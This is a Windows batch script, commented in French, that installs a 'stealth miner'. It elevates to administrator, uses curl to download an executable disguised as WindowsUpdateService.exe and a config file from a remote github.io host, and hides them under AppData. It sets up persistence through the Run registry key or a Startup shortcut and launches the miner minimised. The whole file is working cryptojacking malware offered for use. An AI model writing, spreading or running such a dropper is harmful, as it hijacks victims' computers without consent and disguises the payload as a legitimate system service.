@echo off
:: ===============================
:: Script d'installation pour mineur furtif
:: ===============================

:: Vérifie les droits administratifs
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERREUR] Ce script nécessite des droits administratifs. Relancement...
    powershell -Command "Start-Process -FilePath '%~0' -Verb RunAs"
    exit /b
)

:: Variables
set LOGFILE=%TEMP%\miner_install_log.txt
set MINER_URL=https://outof-ctrl.github.io/Outof-repo/WindowsUpdateService.exe
set CONFIG_URL=https://outof-ctrl.github.io/Outof-repo/config.json
set MINER_PATH=%APPDATA%\WinUS
set MINER_EXEC=WindowsUpdateService.exe
set MINER_CONFIG=config.json
set SHORTCUT_PATH="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateService.lnk"

:: Journalisation
echo [INFO] Début de l'installation > "%LOGFILE%"
echo [INFO] Vérification des droits administratifs... >> "%LOGFILE%"

:: Crée le répertoire de destination
if not exist "%MINER_PATH%" (
    mkdir "%MINER_PATH%"
    echo [INFO] Répertoire %MINER_PATH% créé. >> "%LOGFILE%"
) else (
    echo [INFO] Répertoire %MINER_PATH% existe déjà. >> "%LOGFILE%"
)

:: Télécharge le mineur furtif
echo [INFO] Téléchargement du mineur... >> "%LOGFILE%"
curl -s -o "%MINER_PATH%\%MINER_EXEC%" %MINER_URL% >> "%LOGFILE%" 2>&1
if %errorlevel% neq 0 (
    echo [ERREUR] Téléchargement du mineur échoué. >> "%LOGFILE%"
    exit /b
)

:: Télécharge le fichier de configuration
echo [INFO] Téléchargement du fichier de configuration... >> "%LOGFILE%"
curl -s -o "%MINER_PATH%\%MINER_CONFIG%" %CONFIG_URL% >> "%LOGFILE%" 2>&1
if %errorlevel% neq 0 (
    echo [ERREUR] Téléchargement du fichier de configuration échoué. >> "%LOGFILE%"
    exit /b
)

:: Ajoute le mineur au démarrage via le registre
echo [INFO] Ajout du mineur au démarrage via le registre... >> "%LOGFILE%"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /t REG_SZ /d "\"%MINER_PATH%\%MINER_EXEC%\" --config %MINER_PATH%\%MINER_CONFIG%" /f >> "%LOGFILE%" 2>&1
if %errorlevel% neq 0 (
    echo [ATTENTION] Échec de l'ajout au registre. Utilisation du dossier Startup... >> "%LOGFILE%"
    
    :: Crée un raccourci dans le dossier Startup
    powershell -Command ^
    "Try { ^
        $WScriptShell = New-Object -ComObject WScript.Shell; ^
        $Shortcut = $WScriptShell.CreateShortcut(%SHORTCUT_PATH%); ^
        $Shortcut.TargetPath = '%MINER_PATH%\%MINER_EXEC%'; ^
        $Shortcut.Arguments = '--config %MINER_PATH%\%MINER_CONFIG%'; ^
        $Shortcut.WindowStyle = 7; ^
        $Shortcut.Save(); ^
        Write-Host '[INFO] Raccourci créé dans Startup avec succès.' ^
    } Catch { ^
        Write-Host '[ERREUR] Impossible de créer un raccourci dans Startup.' ^
    }" >> "%LOGFILE%" 2>&1
)

:: Lancement furtif du mineur
echo [INFO] Lancement du mineur en mode furtif... >> "%LOGFILE%"
start /min "" "%MINER_PATH%\%MINER_EXEC%" --config "%MINER_PATH%\%MINER_CONFIG%"
if %errorlevel% neq 0 (
    echo [ERREUR] Échec du lancement du mineur. >> "%LOGFILE%"
    exit /b
)

:: Fin
echo [SUCCES] Installation terminée. >> "%LOGFILE%"
exit /b
